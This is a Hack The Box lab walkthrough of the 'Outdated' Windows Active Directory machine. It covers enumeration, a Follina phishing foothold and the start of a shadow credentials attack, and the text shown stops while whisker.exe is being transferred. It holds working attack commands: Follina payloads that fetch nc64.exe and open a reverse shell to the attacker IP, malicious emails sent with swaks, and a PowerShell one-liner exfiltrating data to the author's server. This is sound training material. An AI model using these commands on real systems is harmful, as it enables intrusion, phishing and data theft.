+++
tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "WSUS", "Kerberos", "Follina", "AD", "Rubeus", "Whisker", "Shadow Credentials", "msDS-KeyCredentialLink"]
draft = false
title = "Outdated HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-13
+++

## Outdated Hack The Box Walkthrough/Writeup: {#outdated-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Outdated>


## How I use variables &amp; wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:
    -   `nmap $box -Pn -oA basicScan`
        ```shell
        kali in 46.02-HTB/BlogEntriesMade/Outdated/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 08:49:14 zsh ❯ nmap $box -Pn -oA basicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 08:49 BST
        Nmap scan report for 10.129.229.239
        Host is up (0.039s latency).
        Not shown: 988 filtered tcp ports (no-response)
        PORT     STATE SERVICE
        25/tcp   open  smtp
        53/tcp   open  domain
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl

        Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
        ```

-   **In depth scan**:
    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`
        ```shell
          kali in 46.02-HTB/BlogEntriesMade/Outdated/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 11s
          🕙 08:49:33 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 08:49 BST
          Nmap scan report for 10.129.229.239
          Host is up (0.040s latency).
          Not shown: 65514 filtered tcp ports (no-response)
          PORT      STATE SERVICE       VERSION
          25/tcp    open  smtp          hMailServer smtpd
          | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
          |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
          53/tcp    open  domain        Simple DNS Plus
          88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-10 15:52:26Z)
          135/tcp   open  msrpc         Microsoft Windows RPC
          139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
          445/tcp   open  microsoft-ds?
          464/tcp   open  kpasswd5?
          593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
          636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
          |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time.
          | ssl-cert: Subject: commonName=DC.outdated.htb
          | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
          | Not valid before: 2023-12-13T00:17:36
          |_Not valid after:  2024-12-12T00:17:36
          3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
          |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time.
          | ssl-cert: Subject: commonName=DC.outdated.htb
          | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
          | Not valid before: 2023-12-13T00:17:36
          |_Not valid after:  2024-12-12T00:17:36
          3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
          | ssl-cert: Subject: commonName=DC.outdated.htb
          | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
          | Not valid before: 2023-12-13T00:17:36
          |_Not valid after:  2024-12-12T00:17:36
          |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time.
          5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_http-title: Not Found
          |_http-server-header: Microsoft-HTTPAPI/2.0
          8530/tcp  open  http          Microsoft IIS httpd 10.0
          |_http-server-header: Microsoft-IIS/10.0
          | http-methods:
          |_  Potentially risky methods: TRACE
          |_http-title: Site doesn't have a title.
          8531/tcp  open  unknown
          9389/tcp  open  mc-nmf        .NET Message Framing
          49667/tcp open  msrpc         Microsoft Windows RPC
          49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
          49692/tcp open  msrpc         Microsoft Windows RPC
          49924/tcp open  msrpc         Microsoft Windows RPC
          49950/tcp open  msrpc         Microsoft Windows RPC
          49984/tcp open  msrpc         Microsoft Windows RPC
          Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
          Device type: general purpose
          Running (JUST GUESSING): Microsoft Windows 2019 (89%)
          Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
          No exact OS matches for host (test conditions non-ideal).
          Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

          Host script results:
          | smb2-time:
          |   date: 2024-10-10T15:53:22
          |_  start_date: N/A
          |_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
          | smb2-security-mode:
          |   3:1:1:
          |_    Message signing enabled and required

          OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
          Nmap done: 1 IP address (1 host up) scanned in 248.40 seconds

        ```

    -   **Findings**:
        -   8530 &amp; 8531
        -   We can see that mail.outdated.htb is used:
            -   `Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows`
            -   I will add that to my `/etc/hosts`


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

<!--listend-->

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools 🐍 v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 08:50:47 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.229.239 with SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=outdated,DC=htb
            CN=Configuration,DC=outdated,DC=htb
            CN=Schema,CN=Configuration,DC=outdated,DC=htb
            DC=DomainDnsZones,DC=outdated,DC=htb
            DC=ForestDnsZones,DC=outdated,DC=htb
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=outdated,DC=htb
          ldapServiceName:
            outdated.htb:dc$@OUTDATED.HTB
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.) 
            ```shell
            serverName:
                CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=outdated,DC=htb
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   {{< figure src="/ox-hugo/2024-10-10-091244_.png" >}}
    -   As we can see there are some interesting entries here:
        -   `mail.outdated.htb` (which was in our NMAP scan)
        -   `client.outdated.htb`
        -   `wsus.outdated.htb`
    -   I add all of these to my `/etc/hosts`


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   **As kerberos is present we can enumerate users using** [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
        -   {{< figure src="/ox-hugo/2024-10-10-090552_.png" >}}
    -   I get 1 valid username I add this to my list of users:
        -   `sflowers@outdated.htb`


### SMTP `25`: {#smtp-25}


#### Connecting to the SMTP service using `telnet`: {#connecting-to-the-smtp-service-using-telnet}

-   `telnet mail.outdated.htb 25`
-   I run `EHLO all` &amp; `help` to enumerate the service:
-   {{< figure src="/ox-hugo/2024-10-10-094237_.png" >}}
-   As we can see we do have the option `AUTH LOGIN`, so this may be useful for later if we need to send anything.
-   +Note+: Remember you can only send mail via `SMTP` on the CLI not read. We need `IMAP` or `POP3` to read.


#### SMTP Commands (via Telnet): {#smtp-commands--via-telnet}

-   `HELO / EHLO`: Identifies your client to the server (use `EHLO` for extended features).
-   `MAIL`: Specifies the sender's email address.
-   `RCPT`: Specifies the recipient's email address.
-   `DATA`: Starts the email body input.
-   `QUIT`: Ends the session.
-   `NOOP`: No operation (used to keep the connection alive).
-   `VRFY`: Verifies if a mailbox exists (not always allowed for privacy reasons).
-   `RSET`: Resets the current session without quitting.


#### I do some user enumeration using [smtp-user-enum](https://www.kali.org/tools/smtp-user-enum/): {#i-do-some-user-enumeration-using-smtp-user-enum}

-   **First with the** `VRFY Method`:
    -   `smtp-user-enum -M VRFY -U ~/Wordlists/seclists/Usernames/Names/names.txt -D mail.$domain -t $box`
        -   {{< figure src="/ox-hugo/2024-10-10-094452_.png" >}}
        -   No hits using the `VRFY` method.

-   **I try again using the** `EXPN` **method but nothing either**:
    -   `smtp-user-enum -M EXPN -U ~/Wordlists/seclists/Usernames/Names/names.txt -D mail.$domain -t $box`
        -   {{< figure src="/ox-hugo/2024-10-10-103402_.png" >}}


#### Attempting to bruteforce SMTP: {#attempting-to-bruteforce-smtp}


##### Using Hydra to bruteforce SMTP: {#using-hydra-to-bruteforce-smtp}

-   `hydra -l itsupport -P +/Wordlists/rockyou.txt $box smtp -t 1`
-   I try hydra however no matter how many threads I set it always disables due to too many connections.
    -   {{< figure src="/ox-hugo/2024-10-10-135511_.png" >}}


##### I try the SMTP NMAP bruteforcing `.nse` script: {#i-try-the-smtp-nmap-bruteforcing-dot-nse-script}

-   `nmap -p 25 --script smtp-brute $box`
-   {{< figure src="/ox-hugo/2024-10-10-135635_.png" >}}


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   `netexec smb $box -u 'guest' -p '' --shares`
-   {{< figure src="/ox-hugo/2024-10-10-090820_.png" >}}
-   `netexec smb $box -u '' -p '' --shares`
-   {{< figure src="/ox-hugo/2024-10-10-090900_.png" >}}
    -   So I can see we have access to the `Shares` share as well as `$IPC`
    -   We can also see that there are multiple mentions of `wsus` as seen in our `DNSenum` findings.


#### Attempting to use the `sflowers` username as password: {#attempting-to-use-the-sflowers-username-as-password}

-   **I try and connect with the** `sflowers` \*user and use their username as password as well as a blank password but no luck:
    -   {{< figure src="/ox-hugo/2024-10-10-091120_.png" >}}


### Logging into the `Shares` to find a `PDF`: {#logging-into-the-shares-to-find-a-pdf}

-   **I login to the SMB share using the guest account &amp; immediatley find a** `pdf`:
    -   `smbclient -U $domain\$guest \\\\$box\\Shares`
    -   {{< figure src="/ox-hugo/2024-10-10-091446_.png" >}}

-   **I download the** `pdf`:
    -   {{< figure src="/ox-hugo/2024-10-10-091600_.png" >}}


### Attempting to extract creator names from the `.PDF`: {#attempting-to-extract-creator-names-from-the-dot-pdf}

If you are not aware, it is sometimes possible to extract valid domain usernames from `pdf's` if they have been created on a Windows host. As often the Creator Field is populated using the Windows User's Logged-In Name

-   **Some reasons why the Creator Field Uses the Windows User's Logged-In Name**:
    -   **PDF Metadata Collection**:
        -   When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.

    -   **System Environment Variables**:
        -   The logged-in Windows username is part of system environment variables. This is often used to populate fields like "`Creator`" in the PDF document.

    -   **Program Defaults**:
        -   By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.

    -   **Tracking Ownership**:
        -   This feature helps track the original creator or author of a document for auditing or document management purposes.


##### Attempting to extract Usernames From the PDF using exiftool: {#attempting-to-extract-usernames-from-the-pdf-using-exiftool}

-   `exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userNames.txt`
-   I run it and check the output of the file, however there are no valid usernames, just that it was created using Word:
-   {{< figure src="/ox-hugo/2024-10-10-091801_.png" >}}

<!--list-separator-->

-  Command Breakdown:

    1.  `exiftool -Creator -csv *pdf`
        -   `exiftool`: Run the tool
        -   `-Creator`: Extracts the `Creator` metadata field from the files.
        -   `-csv`: Outputs the data in CSV format.
            -   This is the most important part for the rest of the command to work:
                -   The `CSV` format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF's metadata is presented as a row, and each field (like "`Creator`") is a column. This makes it easier to process the data programmatically.
                -   **Simplicity**: When using tools like `cut`, it’s easier to extract specific fields by referring to column numbers (e.g., `-f2` for the second column), which is straightforward with `CSV` formatting.
        -   `*pdf`: Targets all PDF files in the current directory.
    2.  `| cut -d, -f2`
        -   `|`: Pipes the output from the previous command into the next.
        -   `cut`: Extracts specific fields from the CSV output.
        -   `-d,`: Uses a comma as the delimiter (since it's CSV data).
        -   `-f2`: Selects the second field, which contains the creator name.
    3.  `| sort`: Sorts the creator names alphabetically.
    4.  `| uniq`: Removes duplicate names, leaving only unique entries.

    5.  `> userNames.txt`
        -   Redirects the final output (unique creator names) into a file named `userNames.txt`


### Reading `NOC_Reminder.pdf` and discovering exploits that the environment is susceptible to: {#reading-noc-reminder-dot-pdf-and-discovering-exploits-that-the-environment-is-susceptible-to}

-   Looking at the PDF it provides a list of vulnerabilities in the environment that they need to patch as well as corresponding CVE's.
    -   {{< figure src="/ox-hugo/2024-10-10-092144_.png" >}}
    -   It also reveals another email address: `itsupport@outdated.htb` is expecting to be sent links to internal web applications to them.
    -   {{< figure src="/ox-hugo/2024-10-10-143233_.png" >}}


### Investigating the CVE list For an attack path: {#investigating-the-cve-list-for-an-attack-path}

-   **I will use these CVE's as a starting point to see if we can find an easy way in.**


##### CVE-2022-30138 PrintSpooler Privilege Escalation: {#cve-2022-30138-printspooler-privilege-escalation}

-   Good privesc path once we have access as this needs to be performed locally.


##### CVE-2022-30129 Remote Code Execution vulnerability in Visual Studio Code: {#cve-2022-30129-remote-code-execution-vulnerability-in-visual-studio-code}

-   This CVE-2022-30129 pertains to a Remote Code Execution vulnerability in Visual Studio Code, affecting versions less than 1.67.1.


##### CVE-2022-29110 Microsoft Excel Remote Code Execution Vulnerability: {#cve-2022-29110-microsoft-excel-remote-code-execution-vulnerability}

-   Microsoft CVE-2022-29110: Microsoft Excel Remote Code Execution Vulnerability


##### CVE-2022-29130 Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability.: {#cve-2022-29130-windows-lightweight-directory-access-protocol--ldap--remote-code-execution-vulnerability-dot}

-   Microsoft Windows: CVE-2022-29130: Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability.


##### CVE-2022-30190 Follina Exploit: {#cve-2022-30190-follina-exploit}

-   This is the follina exploit, it is a microsoft word exploit.
    -   There is a great writeup here by HTB.
        -   <https://www.hackthebox.com/blog/cve-2022-30190-follina-explained>
    -   John Hammond also has a great video here {{&lt; youtube dGCOhORNKRk &gt;}}


## 2. Foothold: {#2-dot-foothold}


### Quick overview on Follina Exploit: {#quick-overview-on-follina-exploit}

-   We craft a malicious Office documents that uses a feature to load remote `HTML` via a link. This triggers `Microsoft Support Diagnostic Tool MSDT` (overview below), allowing us to execute arbitrary code on the victim's machine without the need for macros.
-   +This is the crazy part+
    -   All that needs to happen for exploitation is that the user opens or +previews+ (if `.rtf` is used) the office document.

<!--listend-->

-   **Attack Path**
    -   This may be valid attack path as we know that `itsupport` is expecting to be sent links.


##### Microsoft Support Diagnostic Tool (MSDT) Overview: {#microsoft-support-diagnostic-tool--msdt--overview}

-   **Purpose**:
    -   `MSDT` is a built-in Windows tool designed to help users troubleshoot and diagnose system problems.
    -   It collects diagnostic information (logs, configurations, etc.) about a system and sends it to Microsoft Support or can be used to automatically resolve issues based on predefined fixes.

-   **Functionality**:
    -   It works through various troubleshooting packs, which are scripts or tools that identify and resolve specific issues (e.g., network connectivity, hardware problems).
    -   Often accessed via Windows troubleshooting settings or invoked by support agents when collecting system data remotely.

-   **How it’s triggered**:
    -   Can be invoked manually by users or automatically through specific command-line arguments.
    -   In the case of the Follina exploit, it was invoked through a URL protocol (e.g., `ms-msdt:`) embedded in a malicious Office document.


### Testing if we can make `itsupport` click an emailed link using `swaks`: {#testing-if-we-can-make-itsupport-click-an-emailed-link-using-swaks}

-   **I use swaks to send an email to the** `itsupport@outdated.htb`:
    -   `swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body "http://10.10.14.43/" --header "Subject: Testing"`
    -   {{< figure src="/ox-hugo/2024-10-10-150005_.png" >}}
    -   I put the IP of my attack box as a link within the body and setup a listener on host.
        -   `nc -nvlp 80`
    -   I do this as I want to see if we send a link will it be clicked.

-   **I get a connection back to my listener once the email is sent**:
    -   {{< figure src="/ox-hugo/2024-10-10-145936_.png" >}}
    -   This verified that if a link is sent to that email address the link will be clicked.


### Trying to get a reverse shell using the `Follina` exploit: {#trying-to-get-a-reverse-shell-using-the-follina-exploit}

-   This section includes all my troubleshooting when I couldn't get things started/moving forward. I want to leave this in as a lot of walkthroughs' are like, so I did A, B, C and that's how I got root. Where as it's never that simple, for me at least, and leads to unrealistic expectations for people just trying to get into the industry/CTF's. So I leave almost everything in, bones and all.


#### Trying to get a reverse shell using `Follina` and a malicious `.doc`: {#trying-to-get-a-reverse-shell-using-follina-and-a-malicious-dot-doc}

-   **I download john-hammonds follina POC**:
    -   <https://github.com/JohnHammond/msdt-follina?tab=readme-ov-file>

-   **Create a base64 encoded reverse shell using** <https://revshells.com>:
    -   {{< figure src="/ox-hugo/2024-10-10-155640_.png" >}}

-   **Run the exploit generator &amp; passing in my base64 encoded string**:
    -   `python3 follina.py -i tun0 -p 9999  -c "powershell -e <base64EncodedString>"`
    -   {{< figure src="/ox-hugo/2024-10-10-155503_.png" >}}

-   **The exploit by default starts the listener too to serve the malicious** `.html`:
    -   {{< figure src="/ox-hugo/2024-10-10-155708_.png" >}}

-   **I start my listener on** `443`:
    -   `nc -nvlp 443`

-   **I use swaks to send the malicious document**:
    -   `swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body "http://10.10.14.43/" --header "Subject: Testing" --attach follina.doc`
    -   {{< figure src="/ox-hugo/2024-10-10-155753_.png" >}}

-   **And I get&#x2026;..nothing**:
    -   Lets get thinking&#x2026;..


#### Trying to get a reverse shell using `Follina` malicious `html`: {#trying-to-get-a-reverse-shell-using-follina-malicious-html}

-   With the `Follina` exploit the `.doc/.rtf` is just a mechanism to have the victim reach out to the malicious `html` which actually has the payload. As we know that if we send a link to the `itsupport` it will be clicked. Which means we should be able to send them a direct link to the malicious `follina` `html`, it be clicked and the payload delivered.


##### Using John Hammond's `Follina` exploit web-server to serve the payload: {#using-john-hammond-s-follina-exploit-web-server-to-serve-the-payload}

-   **I double check that the html is working by running curl**:
    -   `curl http://10.10.14.43:9999`
    -   We can see it is here so we know it is running:
    -   {{< figure src="/ox-hugo/2024-10-10-160414_.png" >}}
        -   If you're wondering why it's so much data, the exploit requires 4096 bytes of padding to be included before the exploit will trigger.

-   **Checking the server we can see the request**:
    -   {{< figure src="/ox-hugo/2024-10-10-160601_.png" >}}

-   **I put the** `nc64.exe` **in the same folder and modify my command**:
    -   `python3 follina.py -i tun0 -p 9999  -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\Windows\Temp\nc64.exe; C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.43 443`
    -   {{< figure src="/ox-hugo/2024-10-11-071239_.png" >}}
    -   What's strange is I can get it trigger the part where it reaches out to the webserver, but it never actually pulls down the `nc64.exe` binary however, it just reaches out to the server.

<!--listend-->

-   **Back to the drawing board&#x2026;.**
    -   I mean I could debug this but there are other publicly available exploits so will try one of them first.


### Getting a Reverse shell using `Follina.py`: {#getting-a-reverse-shell-using-follina-dot-py}

-   **I find this exploit**:
    -   <https://github.com/chvancooten/follina.py>

-   **I copy the** `nc64.exe` **binary to it's root web folder** `/www`:

-   **Start the webserver &amp; put my command I want to run when the victim reaches the malicious** `html`:
    -   `python follina.py -t rtf -m command -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\\Windows\\Temp\\nc64.exe; C:\\Windows\\Temp\\nc64.exe -e cmd.exe 10.10.14.43 443'`
    -   {{< figure src="/ox-hugo/2024-10-11-074938_.png" >}}
    -   +Note+: With this particular exploit the author does to use double backslashes to escape them.

-   **Send my email via** `swaks`:
    -   `swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body "Here is the web app - http://10.10.14.43/exploit.html" --header "Subject: Web"`

-   **We immediately get a hit on the web server**:
    -   {{< figure src="/ox-hugo/2024-10-11-075043_.png" >}}

-   **We catch our shell Caught**:
    -   {{< figure src="/ox-hugo/2024-10-11-075203_.png" >}}


### Enumerating as the user `btables`: {#enumerating-as-the-user-btables}


#### Checking if `PrintSpoofer` is a viable exploit path: {#checking-if-printspoofer-is-a-viable-exploit-path}

-   **As we saw that** `PrintSpooler/PrintSpoofer` **was mentioned the first thing to check is the privileges of our user**:
    -   To perform this attack we need either `SeAssignPrimaryTokenPrivilege` or `SeImpersonatePrivilege` we have neither.
    -   {{< figure src="/ox-hugo/2024-10-11-101536_.png" >}}
    -   Maybe we can activate them with [EnableAllTokePrivs.ps1](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77)

-   **I transer** [EnableAllTokePrivs.ps1](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77):
    -   `powershell -c wget http://10.10.14.43:9000/EnableAllTokenPrivs.ps1 -o tp.ps1`
    -   {{< figure src="/ox-hugo/2024-10-11-101954_.png" >}}

-   **I run it**:
    -   {{< figure src="/ox-hugo/2024-10-11-102126_.png" >}}
    -   No luck:
    -   {{< figure src="/ox-hugo/2024-10-11-102149_.png" >}}


#### Finding a `check_mail.ps1` script containing clear text creds: {#finding-a-check-mail-dot-ps1-script-containing-clear-text-creds}

-   **I discover a script called** `check_mail.ps1` **in the users home folder**::
    -   {{< figure src="/ox-hugo/2024-10-10-183411_.png" >}}

-   **Reading the contents of the script reveals a new username and a clear-text password**:
    -   {{< figure src="/ox-hugo/2024-10-10-190326_.png" >}}
    -   I add the username and password to my list:

-   **I check if the username &amp; password can be used to access SMB or LDAP but they cannot**:
    -   {{< figure src="/ox-hugo/2024-10-11-094845_.png" >}}


#### Reading Emails using `check_mail.ps1`: {#reading-emails-using-check-mail-dot-ps1}

-   **I run the** `check_mail.ps1` **script**:
    -   `powershell -c .\.check_mail.ps1`
    -   {{< figure src="/ox-hugo/2024-10-11-095038_.png" >}}
    -   I have a feeling this is just the automated mechanism to read the email we sent.


#### Trying to Extract Credentials using [LaZagne.exe](https://github.com/AlessandroZ/LaZagne): {#trying-to-extract-credentials-using-lazagne-dot-exe}

-   **I transer** `LaZagne.exe` **over to hunt for passwords**:
    -   `curl http://10.10.14.43:9000/LaZagne.exe -o lz.exe`
    -   I get a big fat nothing:
        -   {{< figure src="/ox-hugo/2024-10-11-095943_.png" >}}


### Using `SharpHound.exe` to enumerate the environment. {#using-sharphound-dot-exe-to-enumerate-the-environment-dot}

-   **I transfer the binary accross**:
    -   `powershell -c wget http://10.10.14.43:9000/SharpHound.exe -o sh.exe`
    -   {{< figure src="/ox-hugo/2024-10-11-102411_.png" >}}

-   **I run the collector**:
    -   `.\sh.exe`
    -   {{< figure src="/ox-hugo/2024-10-11-102440_.png" >}}


### Transferring the `SharpHound` Zip back to myself using my custom python webserver: {#transferring-the-sharphound-zip-back-to-myself-using-my-custom-python-webserver}

1.  **Start my custom python webserver**:
    -   I have this handy python webserver that is useful when exfiling data.
        -   You can find it here: <https://github.com/bloodstiller/bloodserver>
        -   Save as `bloodserver.py`
        -   Run `python3 bloodserver.py -u bloodstiller --password bl00dst1ll3r -p 9999 --https`
        -   {{< figure src="/ox-hugo/2024-10-11-114129_.png" >}}
    -   +NOTE+:
        -   Will output file as `uploaded_file`
        -   FYI my server has certs and you can enter in passwords &amp; usernames or it will auto-generate one for you.
        -   The only reason I am not using `443` for https is because my revers-shell is running over that.

2.  **Send the file from victim using** `powershell`:
    ```powershell
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.WebClient; $wc.Headers.Add("Authorization", "Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("bloodstiller:bl00dst1ll3r"))); try { $response = $wc.UploadData("https://10.10.14.43:9999", [System.IO.File]::ReadAllBytes("C:\Users\btables\20241011102426_BloodHound.zip")); Write-Host "Server response: $([System.Text.Encoding]::UTF8.GetString($response))"; Write-Host "File sent successfully!" } catch { Write-Host "An error occurred: $_" }
    ```

    -   {{< figure src="/ox-hugo/2024-10-11-113819_.png" >}}
    -   **File received on our attack host**:
        -   {{< figure src="/ox-hugo/2024-10-11-113854_.png" >}}
        -   +Note+: The file will be called `uploaded_file` you will have to change it back to a  `zip` file.


## 3. Lateral Movement: {#3-dot-lateral-movement}


### Discovering `btables` has `AddKeyCredentialLink` privilege over `sflowers`: {#discovering-btables-has-addkeycredentiallink-privilege-over-sflowers}

-   After ingesting the data into bloodhound we can see that `btables` has the `AddKeyCredentialLink` privilege over `sflowers`.
-   {{< figure src="/ox-hugo/2024-10-11-120229_.png" >}}

-   **We can perform a shadow credentials attack to take advantage of this privilege**:
    -   If you are unfamiliar with this attack vector I have a write up here:
        -   <https://bloodstiller.com/articles/shadowcredentialsattack/>
    -   To put it simply: If we have the `WriteProperty` privilege (specifically for the `msDS-KeyCredentialLink` attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed.


### Building `whisker.exe`: {#building-whisker-dot-exe}

-   **I actually don't the binary in my folder of binaries so will have to build**:
    -   I open up my windows VM.
    -   Clone the repo.
        -   `git clone https://github.com/eladshamir/Whisker`
    -   Open up Visual `Studio 2022`
        -   {{< figure src="/ox-hugo/2024-10-11-140328_.png" >}}
    -   Build &amp; voila a nice new `whisker.exe` binary.


### Adding Shadow Credentials to `sflowers` using `whisker.exe` : {#adding-shadow-credentials-to-sflowers-using-whisker-dot-exe}

-   **I transfer** `whisker.exe` **to the host**:
